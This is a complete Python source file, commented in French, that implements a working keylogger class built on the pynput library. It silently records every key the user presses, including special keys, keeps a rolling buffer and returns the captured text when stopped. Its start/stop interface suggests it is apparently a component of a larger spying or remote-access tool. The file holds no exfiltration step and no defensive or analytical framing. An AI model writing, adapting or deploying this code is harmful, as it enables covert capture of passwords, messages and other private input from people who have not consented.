import threading
import time
try:
    import pynput
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

class Keylogger:
    def __init__(self):
        self.is_running = False
        self.logged_keys = []
        self.listener = None
        
    def start(self):
        # demarre le keylogger
        if not PYNPUT_AVAILABLE:
            return False
            
        if self.is_running:
            return True
            
        try:
            self.is_running = True
            self.logged_keys = []
            
            self.listener = keyboard.Listener(on_press=self._on_key_press)
            self.listener.start()
            return True
        except Exception:
            self.is_running = False
            return False
            
    def stop(self):
        # arrete le keylogger et retourne les logs
        if not self.is_running:
            return "Keylogger not running"
            
        self.is_running = False
        
        if self.listener:
            try:
                self.listener.stop()
            except:
                pass
                
        # formate les logs
        log_text = "".join(self.logged_keys)
        self.logged_keys = []
        
        return log_text if log_text else "No keys logged"
        
    def _on_key_press(self, key):
        # traite les touches pressees
        if not self.is_running:
            return False
            
        try:
            if hasattr(key, 'char') and key.char is not None:
                # touches normales
                self.logged_keys.append(key.char)
            else:
                # touches speciales
                key_name = str(key).replace("Key.", "")
                if key_name == "space":
                    self.logged_keys.append(" ")
                elif key_name == "enter":
                    self.logged_keys.append("\n")
                elif key_name == "tab":
                    self.logged_keys.append("\t")
                elif key_name == "backspace":
                    if self.logged_keys:
                        self.logged_keys.pop()
                else:
                    self.logged_keys.append(f"[{key_name}]")
                    
            # limite la taille du log
            if len(self.logged_keys) > 1000:
                self.logged_keys = self.logged_keys[-500:]
                
        except Exception:
            pass